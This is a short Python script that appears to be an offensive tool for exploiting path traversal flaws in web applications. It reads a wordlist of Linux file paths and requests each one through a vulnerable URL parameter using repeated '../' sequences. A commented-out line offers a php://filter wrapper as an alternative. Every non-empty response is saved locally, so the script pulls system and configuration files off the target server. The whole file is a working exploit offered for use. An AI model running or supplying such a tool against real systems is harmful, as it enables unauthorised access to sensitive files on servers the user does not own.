#!/usr/bin/env python3
import requests
import sys
import os
error_message="Usage: python3 path_traversal_downloader.py <url> <dictionary>\nExample: python3 path_traversal_downloader.py https://test.xyz?page= /usr/share/wordlists/linux_files.txt"
try:
    url=sys.argv[1]
except:
    print(error_message)
    sys.exit()
try:
    dictionary=sys.argv[2]
except:
    print(error_message)
    sys.exit()
downloads_dir='downloads'
if not os.path.exists(downloads_dir):
    os.mkdir(downloads_dir)
with open(dictionary) as fp:
    line = fp.readline()
    while line:
        #choose method to retrieve files
        #r=requests.get(url+'php://filter/resource={}'.format(line.strip()))
        r=requests.get(url+'../../../../../../..{}'.format(line.strip()))
        response=r.text
        if(len(r.content)>0):
            files="{}.txt".format(line.strip().replace("/","_"))
            with open(os.path.join(downloads_dir,files), "w") as f:
                f.write(r.text)
        line=fp.readline()
